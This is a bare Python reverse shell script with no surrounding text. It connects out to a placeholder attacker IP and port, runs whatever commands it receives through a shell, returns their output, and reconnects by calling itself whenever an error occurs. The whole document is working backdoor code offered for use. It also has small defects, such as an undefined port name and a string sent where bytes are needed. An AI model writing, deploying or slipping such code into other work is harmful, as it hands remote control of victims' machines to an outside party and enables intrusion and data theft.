import socket
import subprocess

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('your_ip_address', your_port_number))
        s.send('[+] Connection established.')

        while True:
            command = s.recv(1024).decode('utf-8')
            if 'exit' in command:
                break
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(output.stdout.read())
            s.send(output.stderr.read())
        s.close()
    except Exception as e:
        connect()

connect()
